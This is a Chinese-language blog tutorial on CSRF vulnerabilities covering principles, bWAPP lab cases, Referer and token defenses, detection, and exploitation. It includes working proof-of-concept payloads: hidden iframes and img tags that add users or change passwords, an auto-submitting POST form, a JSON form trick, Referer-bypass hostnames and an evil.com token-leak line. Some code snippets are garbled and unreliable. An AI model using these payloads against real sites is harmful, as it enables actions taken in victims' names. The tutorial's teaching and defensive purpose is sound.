---
title: CSRF 漏洞
comments: true
toc: true
description: 本文主要介绍并总结了 CSRF 的原理、危害、测试、利用及防御
categories:
    - websec
date: 2019-10-05 16:15:58
tags:
---

# CSRF 漏洞定义

CSRF（Cross-Site Request Forery）也被称为 One Click Attack 或者 Session Riding，通常缩写为 CSRF 或者 XSRF

XSS 与 CSRF 区别：

1. XSS 利用站点内的信任用户，盗取 Cookie
2. CSRF 通过伪装成受信任用户请求受信任的网站

# CSRF 漏洞原理

CSRF 是跨站请求伪造，不攻击网站服务器，而是冒充用户在站内的正常操作，通常由于服务端没有对请求头做严格过滤引起的。CSRF 会造成密码重置、用户伪造等问题，可能引发严重后果。

绝大多数网站是通过 Cookie 等方式辨识用户身份，再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户锁不知道的请求。CSRF 攻击会令用户在不知情的情况下攻击自己已经登陆的系统。

利用目标用户的合法身份，以目标用户的名义执行某些非法操作。

可以这么理解 CSRF 攻击：攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF 能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账.……造成的主要问题包括：个人隐私的泄露以及财产安全。

例如：简单的转账案例

初始化链接：`http://www.xxx.com/pay.php?user=xxx&money=100`

黑客构造以下恶意链接，然后诱导用户在登录状态下点击该链接，便可以实现向自己转账的目的。

`http://www.xxx.com/pay.php?user=恶意用户&money=10000`

# 浏览器的 Cookie 机制

## 两种表现形式

1. 本地 cookie， 又称持久性 Cookie

    服务器端脚本语言向客户端发送 cookie，发送时定制了时效、过期时间 expire，存储在**本地**。

2. 临时性 Cookie， 又称 Session Cookie

    没有定义 expire 字段，存储在**浏览器内存**中，关闭浏览器，cookie 失效。

# CSRF 危害

1. 发送邮件。

2. 修改账户信息

3. 资金转账

4. XSS 与 CSRF

5. CSRF 蠕虫

# CSRF 类型

## Get 型 CSRF

假如微博存在 CSRF 漏洞，有一个 GET 请求让别人点击后，关注我，这时可以做一些诱导性的博客。例如想让每一个用户都帮助自己转发微博，制造一次蠕虫攻击，找到转播文章的页面与关注我的页面，写一个 POC，用 `<iframe>` 标签来加载 URL，加载两条 URL，这时当用户点击会关注并且自动转发。

### 案例一

```
<?php
	//会话验证，一般是客户端向服务端发送之前的 session_id	<——————确认用户已经登陆
	$user = $_GET['user'];
	$money = $_GET['money'];
	//转账操作				<————————开始转账
>
```

由此得出 CSRF 成功利用的条件：

1. 用户已经登陆系统
2. 用户访问对应 URL

CSRF 漏洞利用：

bWAPP 的 CSRF

CSRF（Change Password）

本关特征：

1. 只输入新密码，不用输入旧密码

2. 使用 get 方式提交。

    ```html
    Request URL:
    http://lab11.me/bWAPP/csrf_1.php?password_new=hack&password_conf=hack&action=change
    ```

    get 参数中直接暴露新密码以及第二次确认的新密码

我们可以直接伪造修改密码的 URL，比如：

```html
Request URL:
http://lab11.me/bWAPP/csrf_1.php?password_new=bug&password_conf=bug&action=change
```

然后诱导用户在登录该网站的状态下，点击该链接，便可以达到恶意修改密码的目的。

诱导的方式可以有很多种，比如：隐蔽利用 img 标签的 src 属性

当然，实际环境中，基本不会出现具有这样特征的修改密码方式，但这对我们了解 CSRF 的原理有着一定的帮助。

**以下的 GET 和 POST 类型的 CSRF 都是由于没有对用户身份进行验证导致的**，因此可以由攻击者另外构造恶意的网页来进行攻击，如果对用户身份进行了验证，那么就不能单独构造网页了。

### 案例二

添加新用户

代码分析

**没有验证用户身份（session、cookie 等）**

```php
	$sq1 = "INSERT INTO `adminsql`(`id`, `username`, `password`) VALUES(13, '$username', '$password')";
	$row = mysq1_query（$sq1）；//执行sql插入语句
	$sq1 = "SELECT * FROM adminsql"；
	if($row = mysq1_query($sql)){
	while($rows = mysq1_fetch_array($row)){
	echo "user:{$rowsI'username']}-----pass:{$rows['password']}"."<br/>"；
	}
```

利用

同上面 bWAPP change password 的利用，隐蔽利用 img 标签的 src 属性，比如：我们构造一个网页，网页中设置一个 img 的 src 为恶意连接，那么用户在登录状态下，访问我们发给他的网页，就会发送恶意的 URL， 从而添加新用户。

## Post 型 CSRF

添加新用户

代码分析

同 GET 也**没有进行用户身份验证**，只是获取参数是使用 POST 获取。

代码利用

利用 hidden 的 input 标签，我们构造恶意网页，网页中显示一些诱惑信息，并且写一个 form 表单，表单的 action 则是存在 CSRF 的网页链接。我们将提前查看的 POST 的数据值对，进行修改，然后在网页中加入 hidden 的 input， name 属性按照 post 的值进行填写， value 我们自己构造一个恶意的。然后诱导用户访问该网页就可以了

# CSRF 漏洞防御

## 使用者的防御

CSRF 攻击之所以能成立，是因为使用者在被攻击的网页是处于已经登入的状态，所以才能做出一些行为。虽然说这些攻击应该由网页那边负责处理，但如果你担心网页会处理不好的话，你可以在每次使用完网站就登出，就可以避免掉 CSRF。不过，这怕是废话，还要用户注意这个安全，要你网站安全人员有个球用。

## Referer Check 防御

原理

HTTP Referer 是 header 的一部分，当浏览器向 web 服务器发送请求的时候，一般会带上 Referer，告诉服
务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。

Referer Check 防御

Referer Check 主要用于防止盗链。同理也可以用来检查请求是否来自合法的“源”。
比如用户修改密码，一定是在登录系统后台之后进行操作。所以在修改提交表单的时候，一定会从系统
后台页面提交，携带 Referer 头。如果 Referer 不是当前系统的域，那么极有可能遭受 CSRF。
缺陷：服务器并非任何时候都可以取到 Referer。例如 HTTPS 跳转到 HTTP。

当用户点击被构造好的 CSRF 利用页面，那么在执行用户对应操作时，提交的 HTTP 请求中就有对应的
Referer 值，此时服务端判断 Referer 值是否与服务器的域名信息有关。如果不相关则不执行操作。

Referer 防御代码编写

在 PHP 中使用 \$\_SERVER[‘HTTP_REFERER] 获取页面提交请求中的 referer 值

```
<?php
	if(strpos($_SERVER[‘HTTP_REFERER], 'xx.com') !== FALSE)
	{
		判断成功
	}
	else
	｛
		判断失败
	｝
?>
```

如何绕过 Rreferer

技巧：如果服务器端只判断当前 Referer 中是否具有域名，那么直接可以新建文件夹。即：在我们站点当中新建一个以该域名为名字的文件夹，然后将恶意文件放入该文件夹中，那么 Referer 中就可以匹配到该域名

## Token 防御

是否设置 Token， 用户每次访问都验证 Token，这样 CSRF 漏洞也就不复存在了

Anti CSRF Token 防御

CSRF 本质原因：重要操作的所有参数都是被恶意攻击者猜测到的。
那么防御措施就是生成一个随机且不被轻易猜测的参数。目前大多数防御都采用 token（不可预测）。

**为什么 token 可以防御 CSRF？**

正常来说，比较容易理解的是，正确的 CSRFtoken 被放在了服务器的 Session 文件中。而 seesion id 一般会被被放在了 cookie 中。

当用户执行增删改操作的时候，服务器会根据 cookie 中的 session id 匹配`用户对应的 Session 文件`（位于服务端），然后从中取出这个 Token 值和用户提交到服务器的 Token 值(这里一般为表单中的 hidden 的 input 标签提交 token)做对比（即：HTTP 请求中的 token）。如果两者数值相同，用户的增删改操作才是被允许执行的，否则用户的请求就是不合法的，即 CSRF。

用户正常操作产生的 Token 是请求页面通过使用 JS 生成的随机数。这个随机数和用户 Session （位于服务端）中的随机数绑定。 但攻击者伪造的链接中，无法计算或者伪造出这个随机数。 因为 HTTP 请求中攻击者伪造出的随机数和用户 Session 中保存的随机数不同，服务器可依据该随机数判断出该请求不是来自用户正常操作，从而拒绝用户请求。

浏览器的同源策略：协议、IP、端口号不同的的 URL 被浏览器视为不同的源。JS 无法跨源获取用户 Cookie 的值。 而且一般来说 Cookie 中的关键字段都有 Http only 属性。拥有该属性的 Cookie 值，即便是同源环境内 Javascript 也无法对其执行操作。所以 **cookie 中的内容** 对攻击者是不可见的。

Token 泄露

GET 型 Token 泄露，**如果页面可以包含访问攻击者的站点**（但没有 XSS 要求那么高），如

```
<img src="http:/evil.com/"/>
```

那么请求中的 Referer 就会携带对应的 GET Token。

POST 型 Token 泄露

利用 XSS 漏洞读取 Cookie，获取存储在其中的 Token 值。

## 敏感操作二次验证

1. 一般情况下，使用 JavaScript 验证（比如：提醒用户该操作是否继续），但是是否执行成功取决于用户，不建议使用。
2. 验证码强制验证

### 验证码防御

验证码防御被认为是对抗 CSRF 最为简单而且有效的防御方法。
CSRF 在用户不知情的情况下完成对应操作，而验证码强制用户与应用程序交互，才能最终完成操作。
通常情况下，验证码能够很好的遏制 CSRF。

出于用户体验考虑，不可能每一个操作都加入验证码。所以验证码只作为辅助手段，不能作为防御
CSRF 的主要解决方案。

-   验证码防御也可以被认为是二次验证

## 参考及推荐

[前端安全系列之二：如何防止 CSRF 攻击？](https://juejin.im/post/5bc009996fb9a05d0a055192#heading-14)

[为什么 CSRF Token 写在 COOKIE 里面](https://blog.csdn.net/sdb5858874/article/details/81666194)

[关于 Token，你应该知道的十件事](https://blog.csdn.net/wabiaozia/article/details/75196939)

[web 安全之 token 和 CSRF 攻击](https://blog.csdn.net/qq_15096707/article/details/51307024)

[彻底弄懂 session，cookie，token](https://segmentfault.com/a/1190000017831088#articleHeader10)

# CSRF 检测

CSRF 是伪造**用户的请求**，所以首先需要清楚用户可以做哪些操作、发哪些请求。

常见的地方：转账，修改用户资料、密码，购买东西、删除文章

手工检测：不必说了，在常见场景下手动检测

半自动检测：常用 BurpSuite，还有 CSRFTester

全自动检测：主要是插件，目前也有现成的

### HTTP 自定义头

如果 Web 应用程序的 HTTP 请求中没有对应的预防措施，那么很大程度上就确定存在 CSRF 漏洞。

情况 A:
无 token 无 referer 验证

情况 B：
无 token 有 referer 验证这种情况比较常见，也许我们抓包发现无 token 正庆幸时，删除 referer 重新提交一看发现报错了
一. 我们可以试试空 referer: 即删除 header 中的 referer 的值，如果服务器只是验证了是否存在 referer 没验证 referer 值 的话，我们重新提交会发现一个 CSRF 漏洞又被发现了~因为所有跨协议传递的请求都是不会送 referer 的，如 https->http ,(这个利 用成本有点高）还有 javascript->http, data->http.

二. 如果直接去掉 referer 参数请求失败，这种还可以继续验证对 referer 的判断是否严格，是否可以绕过。

修改 referer 值：如果原 referer 值为 Referer： t.qq.com/xxxx 话，我们可以试试修改为 Referer: t.qq.com.baidu.com/xxx。如果服务器只是验证了 referer 是否存在 qq.com 或者 t.qq.com 等关键词的话，争对前一种 情况，我们可以在腾讯某子站点（http://xx.qq.com）发个帖子将图片地址修改为我们构造的csrf链接或者写好CSRF表单后将地址发布在 微博上等待其它用户点击，针对后一种情况我们可以建立个 t.qq.com.yourdomain.com 的域名存放 CSRF 表单来绕过 REFERER 检测;

当只采用 refer 防御时，可以把请求中的修改成如下试试能否绕过：

原始 refer：`http://test.com/index.php`

测试几种方式（以下方式可以通过的话即可能存在问题）：

```
http://test.com.attack.com/index.php

http://attack.com/test.com/index.php
```

### GET 类型

如果有 token 等验证参数，先去掉参数尝试能否正常请求。如果可以，即存在 CSRF 漏洞。

POST 类型

​ 如果有 token 等验证参数，先去掉参数尝试能否正常请求。如果可以，再去掉 referer 参数的内容，如果仍然可以，说明存在 CSRF 漏洞，可以利用构造外部 form 表单的形式，实现攻击。

改 Method

有些程序后端可能是用 REQUEST 方式接受的，而程序默认是 POST 请求，其实改成 GET 方式请求也可以发送过去，存在很严重的隐患。

[CSRF 简单判断方法](https://blog.51cto.com/eth10/1974796)

[CSRF 手工测试方法](https://www.cnblogs.com/milantgh/p/3729421.html)

[CSRF 漏洞复习总结](https://www.lstazl.com/csrf%E6%BC%8F%E6%B4%9E%E5%A4%8D%E4%B9%A0%E6%80%BB%E7%BB%93/)

[CSRF 安全测试流程](https://blog.csdn.net/Breeze_CAT/article/details/84955701)

# 漏洞修补逻辑分析

CSRF 漏洞实质：服务器无法准确判断当前请求是否是合法用户的自定义操作。

如果服务器在用户登录之后给予用户一个唯一合法令牌，每一次操作过程中，服务器都会验证令牌是否正确，如果正确，执行操作。不正确，则不执行操作。
一般情况下，给予的令牌会写入表单中隐藏域的 value 值中，随着表单内容进行提交。

登录验证 login.php --> 登录成功执行操作，操作过程中有 cookie 提交的身份凭证 ---> 登录后执行操作（增删改查）---> 没有登录成功执行操作自动跳回登录页面

远程构造 CSRF 利用 POC，用户点击，就会发送同时携带 session 的请求，成功利用 POC。如果利用在增删改中设置唯一令牌，执行操作时只有提交令牌才能操作的话，就可以有效防止 CSRF。如果令牌不正确，那么不执行操作。并给出提示内容。

登录成功后，给与唯一令牌

增删改部分给与令牌，并在提交操作时，提交令牌并进行验证。一般情况下，使用表单 hidden 进行提交，或者 Cookie。

## 生成 Token 代码分析

Token 作为识别操作是否是当前用户自己操作的唯一凭证，需要设置为复杂难以被破解的内容

例如：

```
function generateToken(){
	$salt = 'test'.data('Y/m/d')
	$token = md5($salt)
	return $token
}
```

但是上述代码的 salt 容易被破解

1. 颗粒度是日，容易被猜测，因此我们可以改成时分秒。
2. test 容易被猜解，可以改成随机长串

## 使用 Token 进行 CSRF 漏洞防御

1. 登录验证成功之后，在会话 SESSION['user_token"] 中保存 Token。

2. 在后台操作中，增删改表单中添加隐藏域 hidden，设置 Value 为 Token。

3. 提交之后进行验证 Token 是否正确。

# CSRF 漏洞利用

1. CSRF 的攻击建立在浏览器与 Web 服务器的会话中
2. 欺骗用户访问 URL

## a 标签的 href

在 html 中，a 标签代表链接，可以将当前的”焦点”指引到其他位置。移动的“焦点”需要发送对应的请求到链接指向的地址，然后返回响应。

```html
<a href="请求地址，会被 http 请求到的位置，可以携带GET型参数">内容</a>

<a
    href="http://127.0.0.1/csrf test/get _csrf/new_user.php？username=liuxiaoyang&password=123456"
    >请点击我</a
>
```

## iframe 标签的 src

iframe 标签内容将在页面加载过程中自动进行加载，src 指向的位置就是页面请求的位置
注意：可以设置 iframe 的 style->display:none，以此来不显示 iframe 加载的内容。

```html
<iframe
    src="http://127.0.0.1/csri_test/get_csrf/new_user.php？username=liuxiaoyang&password=123456"
    style="display:none"
/>
```

## 隐藏的 iframe

常用会返回信息的 POST 型 CSRF，使用隐藏的 iframe 进行攻击，就不会让受害者发现。

```html
<iframe style="display:none" name="csrf-frame"> </iframe>
<form
    method="POST"
    action="https://xxx.com/delete"
    target="csrf- frame"
    id="csrf-form"
>
    <input type="hidden" name="id" value="3" />
    <input type="submit" value="submit" />
</form>
<script>
    document.getElementById("csrf-form").submit();
</script>
```

开一个看不见的 iframe，让 form submit 之后的结果出现在 iframe 里面，而且这个 form 还可以自动 submit。

## img 标签的 src

img 标签利用
img 标签的内容会随着页面加载而被请求，以此 src 指向的位置会在页面加载过程中进行请求。

```html
<img
    src="http://127.0.0.1/csrf test/get_csrf/new_user.php？username=liuxiaoyang&password=123456"
/>
```

## CSS-backgroud 利用

可以利用 CSS 中 background 样式中的 url 来加载远程机器上的内容，从而对 url 中的内容发送 HTTP 请求
例如：

```
body{
background:#00FF00 url（''）no-repeat fixed top；
}

<h1 style="background:url("http://127.0.0.1/csrf_test/get_csrf/new_user.php?username=123123& password=123456');"">CSRF
POC</h1>

```

## 构造 JSON

如果后端只接受 JSON 数据，[spring 的 document ](https://docs.spring.io/spring-security/site/docs/current/reference/html/csrf.html) 也可以构造（注：这个我没测试过 emm）

```html
<form
    action="https://small-min.blog.com/delete"
    method="post"
    enctype="text/plain"
>
    <input name='{"id":3, "deleteid":"' value='2"}' type="hidden" />
    <input type="submit" value="delete!" />
</form>
```

这样子会产生如下的 request body：

```json
{ "id": 3, "deleteid": "2" }
```

> `form`能够带的 content type 只有三种：`application/x-www-form-urlencoded`, `multipart/form-data`跟`text/plain`。在上面的攻击中我们用的是最后一种，`text/plain`，如果你在你的后端 Server 有检查这个 content type 的话，是可以避免掉上面这个攻击的。

如果你的 api 接受 cross origin 的 request ，即：你的 api 的`Access-Control-Allow-Origin`设成`*`的话，代表任何 domain 都可以发送 ajax 到你的 api server，这样无论你是改成 json，甚至把 method 改成 PUT, DELETE 都没有用。

XSS 与 CSRF

1. self xss 与 CSRF

1. 一般 xss 与 csrf

    通过 xss 可以获取 token，（因为像 script img link 等标签不受浏览器同源策略的影响，可以跨域。而一般标签是无法跨域的。），然后使用 token 与 csrf 伪造用户操作。

# 推荐资料

[CSRF 指北](https://www.tr0y.wang/2019/06/02/CSRF%E6%8C%87%E5%8C%97/)
